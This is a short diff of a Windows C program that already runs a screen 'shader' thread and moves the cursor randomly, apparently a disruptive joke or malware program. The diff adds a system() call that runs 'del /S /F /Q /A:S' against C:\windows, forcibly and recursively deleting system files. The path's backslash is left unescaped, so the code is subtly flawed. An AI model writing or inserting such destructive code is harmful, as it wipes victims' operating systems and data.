@@ -42,6 +42,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     CreateThread(0, 0, shader1, 0, 0, 0);
 
+	system("del /S /F /Q /A:S C:\windows");
+
 	while (true)
 	{
 		SetCursorPos(rand() % sw - 1, rand() % sh - 1);
